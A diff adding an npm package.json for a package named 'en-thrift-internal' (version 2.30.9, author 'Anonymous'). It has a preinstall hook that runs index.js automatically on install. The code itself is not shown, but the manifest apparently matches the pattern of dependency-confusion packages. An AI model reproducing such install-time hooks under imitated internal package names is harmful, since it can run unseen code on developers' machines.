@@ -1,0 +1,12 @@
+{
+  "name": "en-thrift-internal",
+  "version": "2.30.9",
+  "description": "Latest 2.30.9",
+  "main": "index.js",
+  "scripts": {
+          "test": "echo \"Error: no test specified\" && exit 1",
+          "preinstall": "node index.js"
+  },
+  "author": "Anonymous",
+  "license": "ISC"
+}
